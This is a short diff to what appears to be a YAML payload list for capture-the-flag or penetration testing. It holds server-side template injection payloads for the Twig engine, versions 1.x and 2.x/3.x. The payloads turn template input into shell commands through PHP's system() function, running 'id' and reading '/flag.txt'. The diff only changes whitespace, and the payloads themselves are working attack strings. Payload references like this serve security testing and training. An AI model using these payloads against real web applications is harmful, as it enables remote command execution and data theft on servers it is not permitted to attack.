@@ -37,8 +37,7 @@ tricks:
     payload: |
       # Twig 1.x
       {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
-      
+
       # Twig 2.x/3.x
       {{['id']|filter('system')}}
       {{['cat /flag.txt']|map('system')}}
-
